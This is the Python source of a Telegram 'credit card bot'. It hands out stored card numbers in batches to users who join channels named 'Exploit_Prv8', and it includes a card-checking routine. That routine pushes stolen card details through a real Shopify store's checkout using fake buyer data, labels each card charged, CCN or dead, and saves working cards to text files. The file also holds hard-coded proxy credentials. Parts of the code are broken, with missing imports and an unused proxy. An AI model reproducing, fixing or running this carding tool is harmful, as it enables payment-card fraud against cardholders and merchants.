import logging
import requests
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
from pymongo import MongoClient
from datetime import datetime
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
from bs4 import BeautifulSoup
import random
import json
import string


mongo_client = MongoClient('localhost', 27017)
db = mongo_client['telegram_db']
users_collection = db['users']
posts_collection = db['posts']
requests_collection = db['user_requests'] 


logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)


telethon_logger = logging.getLogger('telethon')
telethon_logger.setLevel(logging.INFO)
telethon_handler = logging.StreamHandler()
telethon_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
telethon_logger.addHandler(telethon_handler)


api_id = ''  
api_hash = ''  
session_str = '' 

client = TelegramClient(StringSession(session_str), api_id, api_hash)
loop = asyncio.get_event_loop()

async def start_client():
    global session_str
    await client.start()
    if not session_str:
        session_str = client.session.save()
        print(f'Session string: {session_str}')
        with open("session.txt", "w") as file:
            file.write(session_str)

loop.run_until_complete(start_client())


channel1_url = 'https://t.me/Exploit_Prv8'
channel2_url = 'https://t.me/Exploit_Prv8_Archive'

def check_membership(user_id, context):
    try:
        member1 = context.bot.get_chat_member(chat_id='@Exploit_Prv8', user_id=user_id)
        member2 = context.bot.get_chat_member(chat_id='@Exploit_Prv8_Archive', user_id=user_id)
        return member1.status in ['member', 'administrator', 'creator'], member2.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Error checking membership: {e}")
        return False, False

def update_membership_status(user_id, context):
    is_member1, is_member2 = check_membership(user_id, context)
    is_member = is_member1 and is_member2
    users_collection.update_one({'user_id': user_id}, {'$set': {'channel1_member': is_member1, 'channel2_member': is_member2, 'is_member': is_member}})
    return is_member

def start(update: Update, context: CallbackContext) -> None:
    user = update.message.from_user
    user_id = user.id
    chat_id = update.message.chat_id

    is_member1, is_member2 = check_membership(user_id, context)
    user_info = {
        'first_name': user.first_name,
        'last_name': user.last_name,
        'user_id': user_id,
        'username': user.username,
        'join_date': datetime.now(),
        'request_count': 0,
        'is_member': is_member1 and is_member2,
        'channel1_member': is_member1,
        'channel2_member': is_member2
    }

    users_collection.update_one({'user_id': user_id}, {'$set': user_info}, upsert=True)

    if is_member1 and is_member2:
        display_bot_menu(update, context)
    else:
        send_membership_message(update.message, context)

def send_membership_message(message, context):
    initial_message = (
        "<b>🔥 | Hello my dear friend, welcome to credit card bot.\n\n"
        "🔻| To start, click on the button below and enter the following channels.\n"
        "🔺| Dear user If you have already been a member of both channels, just click on the confirmation button.</b>"
    )
    msg = message.reply_text(initial_message, parse_mode='HTML')

    
    context.job_queue.run_once(show_next_message, 10, context={'chat_id': msg.chat.id, 'message_id': msg.message_id})

def show_next_message(context: CallbackContext):
    job = context.job
    chat_id = job.context['chat_id']
    message_id = job.context['message_id']
    
    
    context.bot.delete_message(chat_id=chat_id, message_id=message_id)

    
    new_message = (
        "<b>🌹 Hello dear friend 🙏🏻 Welcome to BOT to receive credit cards.\n\n"
        "🤖 To get card numbers, first enter the channel below.\n\n"
        "⭕️ After joining all the channels, click on confirmation of membership so that the robot will be activated for you.</b>"
    )
    keyboard = [
        [InlineKeyboardButton("Login To The Channel 1", url=channel1_url)],
        [InlineKeyboardButton("Login To The Channel 2", url=channel2_url)],
        [InlineKeyboardButton("Confirm Membership", callback_data='confirm_membership')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    context.bot.send_message(chat_id=chat_id, text=new_message, reply_markup=reply_markup, parse_mode='HTML')

def button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id

    if query.data == 'confirm_membership':
        if update_membership_status(user_id, context):
            query.edit_message_text(text="<b>Membership confirmed! Welcome to the bot menu.</b>", parse_mode='HTML')
            display_bot_menu(query, context)
        else:
            query.edit_message_text(text="<b>You must join both channels to activate the bot. Please join the channels and try again.</b>", parse_mode='HTML')
            show_next_message_auto(query, context)  

    elif query.data.startswith('orders_'):
        page = int(query.data.split('_')[1])
        send_order_history(query.message, context, user_id, page)

    elif query.data == 'check_card':
        query.message.reply_text("<b>🔍 Please enter the bank card number:</b>", parse_mode='HTML')
        context.user_data['awaiting_card_number'] = True

def send_random_cards(message, context, num_cards, user_id):
    try:
        user = users_collection.find_one({'user_id': user_id})
        used_cards = user.get('orders', [])
        available_cards = list(posts_collection.find({'message': {'$nin': used_cards}}).limit(num_cards))
        
        if available_cards:
            card_numbers = '\n'.join([card['message'] for card in available_cards])
            users_collection.update_one(
                {'user_id': user_id}, 
                {
                    '$addToSet': {'orders': {'$each': [card['message'] for card in available_cards]}},
                    '$inc': {'request_count': 1}
                }
            )
            
            message.reply_text(f"<b>💰 Here are your {num_cards} card numbers:\n\n{card_numbers}</b>", parse_mode='HTML')
        else:
            message.reply_text("<b>❌ No card data available.</b>", parse_mode='HTML')
    except Exception as e:
        logger.error(f"Error sending random cards: {e}")
        message.reply_text("<b>Error retrieving card data.</b>", parse_mode='HTML')

def show_next_message_auto(update, context: CallbackContext):
    chat_id = update.message.chat_id if isinstance(update, Update) else update.from_user.id
    
    new_message = (
        "<b>🌹 Hello dear friend 🙏🏻 Welcome to BOT to receive credit cards.\n\n"
        "🤖 To get card numbers, first enter the channel below.\n\n"
        "⭕️ After joining all the channels, click on confirmation of membership so that the robot will be activated for you.</b>"
    )
    keyboard = [
        [InlineKeyboardButton("Login To The Channel 1", url=channel1_url)],
        [InlineKeyboardButton("Login To The Channel 2", url=channel2_url)],
        [InlineKeyboardButton("Confirm Membership", callback_data='confirm_membership')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    context.bot.send_message(chat_id=chat_id, text=new_message, reply_markup=reply_markup, parse_mode='HTML')

def display_bot_menu(update_or_query, context):
    user = update_or_query.message.chat if isinstance(update_or_query, Update) else update_or_query.from_user
    user_id = user.id

    if not update_membership_status(user_id, context):
        send_membership_message(update_or_query.message, context)
        return

    
    current_date = datetime.now().strftime("%A %Y-%m-%d %H:%M:%S")

    
    full_name = user.full_name if user.full_name else user.username

   
    welcome_message = (
        f"<b>✅ Dear {full_name}, Welcome to the bank card number receiving bot.\n\n"
        f"📅 Date: {current_date}\n\n"
        "ℹ️ Choose one of the options:</b>"
    )

    keyboard = [
        [
            KeyboardButton("💳 Get 1 Card"),
            KeyboardButton("💳💳 Get 5 Cards"),
            KeyboardButton("💳💳💳 Get 10 Cards")
        ],
        [
            KeyboardButton("🔍 Check Card"),
            KeyboardButton("📜 Order History"),
            KeyboardButton("🆔 Get user ID")
        ]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    update_or_query.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='HTML')

def validate_card_number(card_number):
    card_number = card_number.replace(" ", "")
    if not re.match(r'^\d{16}$', card_number):
        return False
    total = 0
    reverse_digits = card_number[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def check_card(message, context, card_number):
    try:
        CNUBR, MONTH, YEAR, CVV = map(str.strip, card_number.split('|'))
    except ValueError:
        message.reply_text("❌ Invalid card format. Please enter in the format CNUBR|MONTH|YEAR|CVV")
        return

    CNUBRstr = str(CNUBR)
    montht = MONTH.replace('0',"")
    b = CNUBRstr[:4]
    c = CNUBRstr[4:8]
    d = CNUBRstr[8:12]
    e = CNUBRstr[12:] 
    sessions = requests.session()
    proxy_url = f"http://uNv39mYeEjkoxByt:iLUULo9khnGB9KqI@geo.iproyal.com:12321"
    proxy = {
        "http": proxy_url,
        "https": proxy_url,
    }       
    time.sleep(10)
    url = "https://evolvetogether.com/cart/34330523467916:1?traffic_source=buy_now"
    response = sessions.get(url, allow_redirects=True)
    if response.status_code == 402:
        message.reply_text("error in proxy")
        return
    elif any(keyword in response.text for keyword in ['Max retries exceeded with url']):
        message.reply_text("proxy error")
        return
    elif response.status_code == 200:
        message.reply_text("done")
    else:
        pass

    final_url = response.url
    template = "https://evolvetogether.com/{shop_id}/checkouts/{location}?traffic_source=buy_now"
    result = parse(template, final_url)
    received_cookies = response.cookies.get_dict()

    if result:
        shop_id = result['shop_id']
        location_value = result['location']
    else:
        message.reply_text("Pattern not found in the URL.")
        return

    new_url = f"https://evolvetogether.com/{shop_id}/checkouts/{location_value}"
    first = sessions.get(new_url)
    if new_url == 443:
        message.reply_text("error in proxy")
        return
    if "recaptcha-response" in first.text:
        message.reply_text("Error: Recaptcha detected")
        return

    pattern = fr'<form data-customer-information-form="true" data-email-or-phone="false" class="edit_checkout" novalidate="novalidate" action="/{shop_id}/checkouts/{location_value}" accept-charset="UTF-8" method="post">\s*<input type="hidden" name="_method" value="patch" autocomplete="off" />\s*<input type="hidden" name="authenticity_token" value="(?P<token>[^"]+)"'
    match = re.search(pattern, first.text)

    if match:
        authenticity_token = match.group('token')
    else:
        message.reply_text("Pattern not found in the HTML response.")
        return

    num = random.randint(100, 99999)
    payload = {
        "query": "query prediction($query: String, $countryCode: AutocompleteSupportedCountry!, $locale: String!, $sessionToken: String, $location: LocationInput) {\n predictions(query: $query, countryCode: $countryCode, locale: $locale, sessionToken: $sessionToken, location: $location) {\n addressId\n description\n completionService\n matchedSubstrings {\n length\n offset\n }\n }\n }",
        "variables": {
            "location": {"latitude": 33.7500, "longitude": -84.3900},
            "query": f"{num} Oregon",
            "sessionToken": "f20d60536117c14d5b830fc021ffc083-1686770213328",
            "countryCode": "US",
            "locale": "EN-US"
        }
    }
    json_payload = json.dumps(payload)

    atlas1 = "https://atlas.shopifysvc.com/graphql"
    headers = {
        "Connection": "keep-alive",
        "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        "Accept": "*/*",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": '"Windows"',
        "Origin": "https://checkout.shopify.com",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Accept-Language": "es-ES,es;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Content-Length": str(len(json_payload))
    }

    response = sessions.post(atlas1, data=json_payload, headers=headers)
    if response.status_code == 402:
        message.reply_text("error in proxy")
        return
    elif any(keyword in response.text for keyword in ['Max retries exceeded with url','Remote end closed connection without response']):
        message.reply_text("proxy error")
        return

    json_response = response.json()
    try:
        address_id = json_response["data"]["predictions"][0]["addressId"]
    except (KeyError, IndexError):
        message.reply_text("Unable to extract addressId from the response")
        return

    atlas2 = "https://atlas.shopifysvc.com/graphql"
    second_payload = {
        "query": "query details($locationId: String!, $locale: String!, $sessionToken: String) {\n address(id: $locationId, locale: $locale, sessionToken: $sessionToken) {\n address1\n address2\n city\n zip\n country\n province\n provinceCode\n latitude\n longitude\n }\n }",
        "variables": {
            "locationId": address_id,
            "locale": "EN-US",
            "sessionToken": "0bdf2578ef5b3663e0c59aa4032ba07a-1706604538927"
        }
    }
    json_second_payload = json.dumps(second_payload)
    response2 = sessions.post(atlas2, data=json_second_payload, headers=headers)
    if response2.status_code == 402:
        message.reply_text("error in proxy")
        return
    elif any(keyword in response2.text for keyword in ['Max retries exceeded with url','Remote end closed connection without response']):
        message.reply_text("proxy error")
        return

    json_response2 = response2.json()
    try:
        address1 = json_response2["data"]["address"]["address1"]
        city = json_response2["data"]["address"]["city"]
        zip_code = json_response2["data"]["address"]["zip"]
        province_code = json_response2["data"]["address"]["provinceCode"]
    except (KeyError, TypeError):
        message.reply_text("Unable to extract desired fields from the response")
        return

    def generate_random_alphabet_string(length):
        alphabet_string = string.ascii_lowercase  
        random_string = ''.join(random.choice(alphabet_string) for _ in range(length))
        return random_string

    fname = generate_random_alphabet_string(7)
    lname = generate_random_alphabet_string(7)

    mail = "anshu91119@gmail.com"
    pnum = random.randint(100, 999)
    unum = random.randint(1000, 9999)
    fnum = str(pnum)
    gnum = str(unum)
    phonenum = "%28786%29" + "+" + fnum + "-" + gnum

    addressu = address1.replace(' ', '+')

    payload3 = {
        "_method": "patch",
        "authenticity_token": authenticity_token,
        "previous_step": "contact_information",
        "step": "payment_method",
        "checkout[email]": mail,
        "checkout[buyer_accepts_marketing]": "0",
        "checkout[billing_address][first_name]": fname,
        "checkout[billing_address][last_name]": lname,
        "checkout[billing_address][company]": "",
        "checkout[billing_address][address1]": addressu,
        "checkout[billing_address][address2]": "",
        "checkout[billing_address][city]": city,
        "checkout[billing_address][country]": "US",
        "checkout[billing_address][province]": province_code,
        "checkout[billing_address][zip]": zip_code,
        "checkout[billing_address][phone]": phonenum,
        "checkout[remember_me]": "",
        "checkout[remember_me]": "0",
        "checkout[client_details][browser_width]": "1903",
        "checkout[client_details][browser_height]": "911",
        "checkout[client_details][javascript_enabled]": "1",
        "checkout[client_details][color_depth]": "24",
        "checkout[client_details][java_enabled]": "false",
        "checkout[client_details][browser_tz]": "-330",
    }

    response3 = sessions.post(new_url, data=payload3, allow_redirects=True)
    if response3.status_code == 402:
        message.reply_text("error in proxy")
        return
    elif any(keyword in response3.text for keyword in ['Max retries exceeded with url','Remote end closed connection without response']):
        message.reply_text("proxy error")
        return

    pmurl = new_url + "?previous_step=contact_information&step=payment_method"
    pmmethod = sessions.get(pmurl)
    if pmmethod.status_code == 402:
        message.reply_text("error in proxy")
        return
    elif any(keyword in pmmethod.text for keyword in ['Max retries exceeded with url','Remote end closed connection without response']):
        message.reply_text("proxy error")
        return

    soup = BeautifulSoup(pmmethod.text, 'html.parser')
    gateway_element = soup.find(attrs={'data-select-gateway': True})
    if gateway_element:
        gateway = gateway_element['data-select-gateway']
    else:
        message.reply_text("Element with data-select-gateway attribute not found")
        return

    pricet_element = soup.find(attrs={'data-checkout-payment-due-target': True})
    if pricet_element:
        pricet = pricet_element['data-checkout-payment-due-target']
    else:
        message.reply_text("Element with data-checkout-payment-due-target attribute not found")
        return

    checkout1 = "https://deposit.us.shopifycs.com/sessions"
    payload4_temp = {
        "credit_card": {
            "number": b + " " + c + " " + d + " " + e,
            "name": "ROBERT CASTILLO",
            "month": montht,
            "year": YEAR,
            "verification_value": CVV,
        },
        "payment_session_scope": "evolvetogether.com"
    }

    headers_last = {
        "Host": "deposit.us.shopifycs.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        "Accept": "application/json",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": '"Windows"',
        "Origin": "https://checkout.shopifycs.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://checkout.shopifycs.com/",
        "Accept-Language": "es-ES,es;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Content-Length": "167",
    }

    response4 = sessions.post(checkout1, json=payload4_temp, headers=headers_last)
    if response4.status_code == 402:
        message.reply_text("error in proxy")
        return
    elif any(keyword in response4.text for keyword in ['Max retries exceeded with url','Remote end closed connection without response']):
        message.reply_text("proxy error")
        return

    if response4.status_code == 200:
        data = json.loads(response4.text)
        if "id" in data:
            parsed_id = data["id"]
        else:
            message.reply_text("no id found")
            return

    payload_final = f"_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={parsed_id}&checkout%5Bpayment_gateway%5D={gateway}&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bpost_purchase_page_requested%5D=0&checkout%5Btotal_price%5D={pricet}&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1349&checkout%5Bclient_details%5D%5Bbrowser_height%5D=657&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240"
    post_final = sessions.post(url=new_url, data=payload_final)
    response_final_site = new_url + "?from_processing_page=1&validate=true"
    response_final = sessions.get(response_final_site)
    if response_final.status_code == 402:
        message.reply_text("error in proxy")
        return
    elif any(keyword in response_final.text for keyword in ['Max retries exceeded with url','Remote end closed connection without response']):
        message.reply_text("proxy error")
        return

    if any(keyword in response_final.text for keyword in ["Thank you for your purchase!", "Your order is confirmed", "Thank you"]):
        response_text = f'''CHARGED
➤ CC:  {card_number}
➤ Response:  Charged
➤ Gate : Shopify gateway '''
        message.reply_text(response_text)
        with open('cvv.txt', 'a') as cvv_file:
            cvv_file.write(card_number + '\n')

    elif any(keyword in response_final.text for keyword in ["Security code was not matched by the processor", "Security codes does not match correct", "CVV mismatch", "CVV2 Mismatch"]):
        response_text = f'''CCN 
➤ CC:  {card_number}
➤ Response: Card security code is incorrect
➤ Gate : Shopify gateway '''
        message.reply_text(response_text)
        with open('ccn.txt', 'a') as ccn_file:
            ccn_file.write(card_number + '\n')
    else:
        soup = BeautifulSoup(response_final.content, 'html.parser')
        error_element = soup.find('p', {'class': 'notice__text'})

        if error_element:
            error = error_element.text
            response_text = f'''DEAD 
➤ CC:  {card_number} ➤ Response: {error} - '''
        else:
            response_text = f'''DEAD 
➤ CC:  {card_number} 
➤ Response: Error element not found in the HTML - '''
        message.reply_text(response_text)

def handle_message(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id

    if context.user_data.get('awaiting_card_number'):
        card_number = update.message.text
        if validate_card_number(card_number):
            update.message.reply_text("<b>☑️ The above bank card number is real.</b>", parse_mode='HTML')
            check_card(update.message, context, card_number)
        else:
            update.message.reply_text("<b>❌ The above bank card number is fake.</b>", parse_mode='HTML')
        context.user_data['awaiting_card_number'] = False

    elif update.message.text == "💳 Get 1 Card":
        send_random_cards(update.message, context, 1, user_id)
    elif update.message.text == "💳💳 Get 5 Cards":
        send_random_cards(update.message, context, 5, user_id)
    elif update.message.text == "💳💳💳 Get 10 Cards":
        send_random_cards(update.message, context, 10, user_id)
    elif update.message.text == "🔍 Check Card":
        update.message.reply_text("<b>🔍 Please enter the bank card number:</b>", parse_mode='HTML')
        context.user_data['awaiting_card_number'] = True
    elif update.message.text == "📜 Order History":
        send_order_history(update.message, context, user_id, 0)
    elif update.message.text == "🆔 Get user ID":
        update.message.reply_text("<b>Please forward a message from the user to receive their numerical ID.</b>", parse_mode='HTML')
        context.user_data['awaiting_user_id'] = True
    elif context.user_data.get('awaiting_user_id'):
        try:
            
            if update.message.forward_from:
                
                target_user_id = update.message.forward_from.id
                target_username = getattr(update.message.forward_from, 'username', 'N/A')
            else:
                
                target_user_id = update.message.from_user.id
                target_username = getattr(update.message.from_user, 'username', 'N/A')

            message_text = (
                f"<b>👤 Username: @{target_username}</b>\n"
                f"<b>🆔 Id: {target_user_id}</b>\n"
            )
            update.message.reply_text(message_text, parse_mode='HTML')

            
            request_info = {
                'searcher_id': user_id,
                'searcher_username': update.message.from_user.username,
                'target_id': target_user_id,
                'target_username': target_username,
                'timestamp': datetime.now()
            }
            requests_collection.insert_one(request_info)

        except Exception as e:
            logger.error(f"Error retrieving user ID: {e}")
            update.message.reply_text("<b>Error retrieving user ID.</b>", parse_mode='HTML')
        finally:
            context.user_data['awaiting_user_id'] = False

def send_order_history(message, context, user_id, page):
    try:
        user = users_collection.find_one({'user_id': user_id})
        orders = user.get('orders', [])
        if not orders:
            message.reply_text("<b>📕 You have no order history.</b>", parse_mode='HTML')
            return

        total_requests = len(orders)  
        orders_per_page = 10
        start = page * orders_per_page
        end = start + orders_per_page
        order_history = '\n'.join(orders[start:end])
        
        if not order_history:
            message.reply_text("<b>📕 No more order history to show.</b>", parse_mode='HTML')
            return

        keyboard = []
        if page > 0:
            keyboard.append(InlineKeyboardButton("⬅️ Previous", callback_data=f'orders_{page - 1}'))
        if end < len(orders):
            keyboard.append(InlineKeyboardButton("➡️ Next", callback_data=f'orders_{page + 1}'))
        
        reply_markup = InlineKeyboardMarkup([keyboard]) if keyboard else None

        message.reply_text(
            f"<b>📕 Your order history (Page {page + 1}):\n\n{order_history}\n\nTotal requests: {total_requests}</b>",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Error sending order history: {e}")
        message.reply_text("<b>Error retrieving order history.</b>", parse_mode='HTML')

def error(update: Update, context: CallbackContext) -> None:
    """Log Errors caused by Updates."""
    logger.warning('Update "%s" caused error "%s"', update, context.error)

def main() -> None:

    updater = Updater("")  


    dispatcher = updater.dispatcher


    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CallbackQueryHandler(button))
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))


    dispatcher.add_error_handler(error)


    updater.start_polling()


    updater.idle()

if __name__ == '__main__':
    main()
